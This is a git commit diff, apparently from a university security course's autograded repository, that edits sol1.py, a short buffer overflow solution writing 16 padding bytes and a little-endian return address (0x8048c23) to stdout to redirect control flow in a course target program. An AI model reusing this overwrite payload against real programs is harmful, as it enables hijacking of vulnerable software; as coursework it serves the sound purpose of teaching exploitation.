24f9690ef375d87ee1c1087fd5ed4e234b3fde01
eecs388 <jack.jusko@gmail.com>
2022-11-14 20:36:04 +0000

    Automatic commit by test script for jjusko

--- sol1.py
+++ sol1.py
@@ -1,4 +1,3 @@
 import sys
-sys.stdout.buffer.write(bytes("asssbcd", 'utf-8'))
-sys.stdout.buffer.write(0x8048c27.to_bytes(4, 'little'))
-sys.stdout.buffer.write(0x8048c27.to_bytes(4, 'little'))
+sys.stdout.buffer.write(b'A'*16)
+sys.stdout.buffer.write(0x8048c23.to_bytes(4, 'little'))
